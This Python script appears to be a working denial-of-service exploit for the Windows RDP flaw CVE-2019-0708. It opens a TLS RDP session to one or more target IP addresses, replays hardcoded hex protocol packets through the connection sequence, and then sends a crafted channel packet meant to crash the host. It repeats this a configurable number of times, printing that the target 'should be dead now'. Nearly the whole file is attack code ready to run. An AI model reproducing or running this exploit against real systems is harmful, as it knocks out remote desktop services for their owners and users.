import time
import socket
import struct
import argparse
import binascii
from OpenSSL import SSL
from impacket.impacket.structure import Structure


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "-i", "--ip", dest="ipToAttack", metavar="IP[,IP,IP,..]", default=None,
            help="Pass a list of IP addresses separated by a comma or a single IP address (*default=None)"
        )
        parser.add_argument(
            "-a", "--arch", type=int, choices=(32, 64), dest="archSelected", metavar="ARCHITECTURE", default=64,
            help="Pass the architecture of the target you are attacking (*default=64)"
        )
        parser.add_argument(
            "-t", "--dos-times", type=int, dest="dosTime", default=60, metavar="AMOUNT",
            help="Pass how many times you want to DoS the target before exiting (*default=60)"
        )
        parser.add_argument(
            "-w", "--wait-time", type=int, dest="waitTime", default=70, metavar="SECONDS",
            help="Pass how long you want to wait in between DoS's (*default=70)"
        )
        parser.add_argument(
            "-v", "--verbose", action="store_true", default=False, dest="runVerbose",
            help="Show the received packets (*default=False)"
        )
        return parser.parse_args()


# same structure bullshit
class TPKT(Structure):
    commonHdr = (
        ('Version', 'B=3'),
        ('Reserved', 'B=0'),
        ('Length', '>H=len(TPDU)+4'),
        ('_TPDU', '_-TPDU', 'self["Length"]-4'),
        ('TPDU', ':=""'),
    )


class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator', 'B=len(VariablePart)+1'),
        ('Code', 'B=0'),
        ('VariablePart', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['VariablePart'] = ''


class CR_TPDU(Structure):
    commonHdr = (
        ('DST-REF', '<H=0'),
        ('SRC-REF', '<H=0'),
        ('CLASS-OPTION', 'B=0'),
        ('Type', 'B=0'),
        ('Flags', 'B=0'),
        ('Length', '<H=8'),
    )


class DATA_TPDU(Structure):
    commonHdr = (
        ('EOT', 'B=0x80'),
        ('UserData', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['UserData'] = ''


class RDP_NEG_REQ(CR_TPDU):
    structure = (
        ('requestedProtocols', '<L'),
    )

    def __init__(self, data=None):
        CR_TPDU.__init__(self, data)
        if data is None:
            self['Type'] = 1


def unpack(packet):
    """
    unpack a packet into its hex
    """
    return binascii.unhexlify(packet)


def structify(packet, struct_mode, differences):
    """
    structify the packets if needed
    """
    assert type(differences) == tuple
    differs = [struct.pack(struct_mode, len(packet)), struct.pack(struct_mode, len(packet) - differences[0]),
               struct.pack(struct_mode, len(packet) - differences[1]),
               struct.pack(struct_mode, len(packet) - differences[2]),
               struct.pack(struct_mode, len(packet) - differences[3]),
               struct.pack(struct_mode, len(packet) - differences[4])]
    return differs


def send_initialization_pdu_packet(host, verbose=False):
    """
    initialize the RDP request
    """
    tpkt = TPKT()
    tpdu = TPDU()
    rdp_neg = RDP_NEG_REQ()
    rdp_neg['Type'] = 1
    rdp_neg['requestedProtocols'] = 1
    tpdu['VariablePart'] = rdp_neg.getData()
    tpdu['Code'] = 0xe0
    tpkt['TPDU'] = tpdu.getData()
    # start the session
    session = socket.socket()
    session.connect((host, 3389))
    session.sendall(tpkt.getData())
    results = session.recv(8192)
    if verbose:
        print("[@] received: {}".format(repr(results)))
    # turn the session into a SSL connection
    ctx = SSL.Context(SSL.TLSv1_METHOD)
    tls = SSL.Connection(ctx, session)
    tls.set_connect_state()
    # handshake like a man
    tls.do_handshake()
    return tls


def send_client_data_pdu_packet(tls, deletion_structure=(12, 109, 118, 132, 390), verbose=False):
    """
    client information packet
    """
    # i've done some more research and this can be a fixed length, but idk what the fixed length is
    # and i dont feel like figuring it out
    packet = unpack(
        "030001ca02f0807f658207c20401010401010101ff30190201220201020201000201010201000201010202ffff0201023019020101020"
        "10102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff02010204820161"
        "000500147c00018148000800100001c00044756361813401c0ea000a0008008007380401ca03aa09040000ee4200004400450053004b0"
        "054004f0050002d004600380034003000470049004b00000004000000000000000c000000000000000000000000000000000000000000"
        "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001"
        "8000f00af07620063003700380065006600360033002d0039006400330033002d003400310039380038002d0039003200630066002d00"
        "00310062003200640061004242424207000100000056020000500100000000640000006400000004c00c00150000000000000002c00c0"
        "01b0000000000000003c0380004000000726470736e6400000f0000c0636c6970726472000000a0c0647264796e766300000080c04d53"
        "5f543132300000000000"
    )
    size_differ_0, size_differ_1, size_differ_2, size_differ_3, size_differ_4, size_differ_5 = structify(
        packet, '>h', deletion_structure
    )
    bin_differ = bytearray()
    bin_differ.extend(map(ord, packet))
    bin_differ[2] = size_differ_0[0]
    bin_differ[3] = size_differ_0[1]
    bin_differ[10] = size_differ_1[0]
    bin_differ[11] = size_differ_1[1]
    bin_differ[107] = size_differ_2[0]
    bin_differ[108] = size_differ_2[1]
    bin_differ[116] = 0x81
    bin_differ[117] = size_differ_3[1]
    bin_differ[130] = 0x81
    bin_differ[131] = size_differ_4[1]
    bin_differ[392] = size_differ_5[1]
    tls.sendall(bytes(bin_differ))
    results = tls.recv(8192)
    if verbose:
        print("[@] received: {}".format(repr(results)))


def send_client_information_pdu_packet(tls):
    """
    client info packets
    """
    packet = unpack(
        "0300016102f08064000703eb7081524000a1a509040904bb47030000000e00080000000000000041004100410041004100410041000000"
        "740065007300740000000000000002001c003100390032002e004141410038002e003200330032002e0031000000400043003a005c0057"
        "0049004e0041414100570053005c00730079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c00"
        "0000a40100004d006f0075006e007400610069006e0020005300740061006e0064006100720064002000540069006d0065000000000000"
        "00000000000000000000000000000000000b00000001000200000000000000000000004d006f0075006e007400610069006e0020004400"
        "610079006c0069006700680074002000540069006d00650000000000000000000000000000000000000000000000030000000200020000"
        "0000000000c4ffffff0100000006000000000064000000"
    )
    tls.sendall(bytes(packet))


def send_channel_pdu_packets(tls, retval_size=1024, verbose=False):
    """
    channel join
    erect domain
    and user packets in one swoop
    """
    packet = unpack("0300000c02f0800401000100")
    tls.sendall(bytes(packet))
    packet = unpack("0300000802f08028")
    tls.sendall(bytes(packet))
    results = tls.recv(retval_size)
    if verbose:
        print("[@] received: {}".format(repr(results)))
    packet = unpack("0300000c02f08038000703eb")
    tls.sendall(bytes(packet))
    results = tls.recv(retval_size)
    if verbose:
        print("[@] received: {}".format(repr(results)))
    packet = unpack("0300000c02f08038000703ec")
    tls.sendall(bytes(packet))
    results = tls.recv(retval_size)
    if verbose:
        print("[@] received: {}".format(repr(results)))
    packet = unpack("0300000c02f08038000703ed")
    tls.sendall(bytes(packet))
    results = tls.recv(retval_size)
    if verbose:
        print("[@] received: {}".format(repr(results)))
    packet = unpack("0300000c02f08038000703ee")
    tls.sendall(bytes(packet))
    results = tls.recv(retval_size)
    if verbose:
        print("[@] received: {}".format(repr(results)))
    packet = unpack("0300000c02f08038000703ef")
    tls.sendall(bytes(packet))
    results = tls.recv(retval_size)
    if verbose:
        print("[@] received: {}".format(repr(results)))


def send_confirm_active_pdu_packet(tls):
    """
    confirm the user is active
    """
    packet = unpack(
        "0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d5354534300170000000100180001000300000200000000"
        "1d04000000000000000002001c00200001000100010080073804000001000100001a010000000300580000000000000000000000000000"
        "0000000000000001001400000001000000aa000101010101000001010100010000000101010101010101000101010000000000a1060600"
        "000000000084030000000000e404000013002800030000037800000078000000fc09008000000000000000000000000000000000000000"
        "000a0008000600000007000c00000000000000000005000c00000000000200020008000a0001001400150009000800000000000d005800"
        "910020000904000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000"
        "00000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe00"
        "0400fe000800fe000800fe001000fe002000fe004000fe008000fe0000014000000800010001030000000f0008000100000011000c0001"
        "0000000028640014000c00010000000000000015000c0002000000000a00011a000800af9400001c000c0012000000000000001b000600"
        "01001e0008000100000018000b0002000000030c001d005f0002b91b8dca0f004f15589fae2d1a87e2d6010300010103d4cc44278a9d74"
        "4e803c0ecbeea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf0200080000014000020101010001"
        "400002010104"
    )
    byte_differ = bytearray()
    byte_differ.extend(map(ord, packet))
    tls.sendall(bytes(byte_differ))


def send_establish_session_pdu_packet(tls):
    """
    establish the connection
    """
    packet = unpack("0300002402f08064000703eb701616001700f003ea030100000108001f0000000100ea03")
    tls.sendall(bytes(packet))
    packet = unpack("0300002802f08064000703eb701a1a001700f003ea03010000010c00140000000400000000000000")
    tls.sendall(bytes(packet))
    packet = unpack("0300002802f08064000703eb701a1a001700f003ea03010000010c00140000000100000000000000")
    tls.sendall(bytes(packet))
    packet = unpack(
        "0300058102f08064000703eb70857272051700f003ea030100000100002b00000000000000a9000000000000000000a900000000000200"
        "0000a3ce2035db94a5e60da38cfb64b763cae79a84c10d67b791767121f96796c0a2775ad8b2744f30352be7b0d2fd81901a8fd55eee5a"
        "6dcbea2fa52b06e90b0ba6ad012f7a0b7cff89d3a3e1f80096a68d9a42fcab14058f16dec805baa0a8ed30d86782d79f84c33827da61e3"
        "a8c365e6ec0cf63624b20ba6171f463016c7736014b5f13a3c957d7d2f747e56ff9ce001329df2d9355e95782fd5156c18340f43d72b97"
        "a9b428f4736c16db43d7e5580c5a03e37358d7d976c2fe0bd7f412431b706d74c23df12660588031070e85a395f89376999feca0d4955b"
        "05fa4fdf778a7c299f0b4fa1cbfa9566ba47e3b044df83034424f41ef2e5cba95304c276cb4dc6c2d43fd38cb37cf3aaf393fe25bd327d"
        "486e939668e5182bea84256902a538656f0f9ff6a13a1d229d3f6de04cee8b24f0dcff7052a70df9528a1e331a301115d7f895a9bb7425"
        "8ce3e9930743f55060f7962ed3ff63e0e324f1103d8e0f56bc2eb8900cfa4b9668fe596821d0ff52fe5c7d90d439be479d8e7aaf954f10"
        "ea7b7ad3ca07283e4e4b810ef15f1f8dbe0640272f4a03803267542f93fd255d6da0ad234572ffd1eb5b5175a761e03fe4eff496cda513"
        "8ae6527470bfc1f9fb689edd728fb4445f3acb752a20a669d276f957462b5bdaba0f9be060e18b9033410a2dc506fed0f0fcde35d41eaa"
        "760baef4d5bdfaf355f5c16765751c1d5ee83afe54502304ae2e71c27697e639c6b2258792635261d16c07c11c00300da72f55a34f23b2"
        "39c7046c97157ad72433912806a6e7c3795cae7f5054c2381e90231dd0ff5a56d61291d296decc62c8ee9a4407c1ecf7b6d99cfe301cdd"
        "b33b93653cb480fbe387f0ee42d8cf08984de76b990a43ed137290a967fd3c6336ec55faf61f35e728f387a6ce2e34aa0db2fe1718a20c"
        "4e5ff0d198624a2e0eb08db17f32528e87c9687c0cefee88ae742a33ff4b4dc5e5183874c72883f77287fc79fb3eced051132d7cb458a2"
        "e628674feca6816cf79a29a63bcaecb8a12750b7effc81bf5d862094c01a0c4150a95e104a82f1741f7821f5706124003d475ff325803c"
        "4beaa3f477eaa1421a170f6da8359e9126344304c6c65b217d8cc722917b2c2d2fd67ea552a80880eb60d144098e3ca1aa67600a26c6b5"
        "c679a64f8b8c255cf10b23f4d8a66df19178f9e52a502f5a4422d9195cafd6ac97a2f80d0ce3dd884898280b8bbd76dcdecae2c24a8750"
        "d48c775ad8b2744f3035bf28aed9a298a5bc60cab8904d2046d98a1a30018b38631a57095146959bd8800cb07724bf2bd35722d9195caf"
        "d6ac97a2f80d0ce3dd884898280b8bbd76dcdecae2c24a8750d48c569238ed6b9b5b1fba53a10ef7751053224c0a758854693f3bf31867"
        "6b0f19d1002586cda8d9dd1d8d268754d979c0746590d73332afba9d5ad56c7ca147e1496e1cce9f62aa26163f3cec5b49e5c060d4bea7"
        "88bca19f29718ceb69f873fbaf29aa401be592d277a72bfbb677b731fbdc1e63637df2fe3c6aba0b20cb9d64b83114e270072cdf9c6fb5"
        "3ac4d5b5c93e9ad7d530dc0e1989c60888e1ca81a628dd9c740511e7e1ccbcc776dd55e2ccc2cbd3b64801ddffbaca31ab26441cdc0601"
        "dff29050b86b8fe829f0baecfb2dfd7afc7f57bdea90f7cf921ec420d0b69fd6dca182a96c5e3e83415773e9e75a3fda244f735ef4e092"
        "24bd0bd03c4996b5b50532cb581d6f9751ee0cdc0b2a60ef973e5a30811591cf1107252c41db7072e175f6a5ffe844e703e361aadbe007"
        "3d070be35c09a95e10fdcf749e23f1308616ef254efea493a5800a0139cc117a6e94225bd8c6c9a8df1396b391336e87bb94632d8864a7"
        "5889dadc7f2ae3a166e5c87fc2dbc77d2fa946284569bcac9f859eb09f9a49b4b1cb"
    )
    tls.sendall(bytes(packet))
    packet = unpack("0300002802f08064000703eb701a1a001700f003ea03010000010000270000000000000003003200")
    tls.sendall(bytes(packet))


def send_dos_packets(tls, arch_selected):
    """
    theoretically, the arch shouldn't matter, but for good measures we'll make it matter
    """
    arch_32_packet = unpack("0300002e02f08064000703ef70140c0000000300000000000000020000000000000000000000")
    arch_64_packet = unpack(
        "0300002e02f08064000703ef70140c000000030000000000000000000000020000000000000000000000000000000000000000000000"
    )
    if arch_selected == 32:
        send_packet = bytes(arch_32_packet)
    else:
        send_packet = bytes(arch_64_packet)
    tls.sendall(send_packet)


def main():
    """
    main
    """
    opt = Parser().optparse()
    to_attack = []

    if opt.ipToAttack is not None:
        for ip in opt.ipToAttack.split(","):
            to_attack.append(ip.strip())
    else:
        print("usage: python 2019-0708-dos.py -i IP[IP,IP,...] [-a 32|64]")
        exit(1)

    for target in to_attack:
        try:
            print("[+] DoSing target: {} a total of {} times".format(target, opt.dosTime))
            for i in range(opt.dosTime):
                print("[+] DoS attempt: {}".format(i+1))
                print("[+] establishing initialization")
                current_tls = send_initialization_pdu_packet(target, verbose=opt.runVerbose)
                print("[+] sending ClientData PDU packets")
                send_client_data_pdu_packet(current_tls, verbose=opt.runVerbose)
                print("[+] sending ChannelJoin ErectDomain and AttachUser PDU packets")
                send_channel_pdu_packets(current_tls, verbose=opt.runVerbose)
                print("[+] sending ClientInfo PDU packet")
                send_client_information_pdu_packet(current_tls)
                print("[+] receiving current")
                results = current_tls.recv(8000)
                if opt.runVerbose:
                    print("[@] received: {}".format(repr(results)))
                results = current_tls.recv(8000)
                if opt.runVerbose:
                    print("[@] received: {}".format(repr(results)))
                print("[+] confirming user is active")
                send_confirm_active_pdu_packet(current_tls)
                print("[+] establishing the connection")
                send_establish_session_pdu_packet(current_tls)
                print("[+] DoSing target: {}".format(target))
                send_dos_packets(current_tls, opt.archSelected)
                print("[+] target should be dead now, waiting {}s before starting again".format(opt.waitTime))
                time.sleep(opt.waitTime)
                print("\n[+] starting again\n")
        except Exception as e:
            print(
                "[!] error on target: {} ({}), if this happened after a successful attack, change the wait "
                "time".format(target, e)
            )


if __name__ == '__main__':
    main()
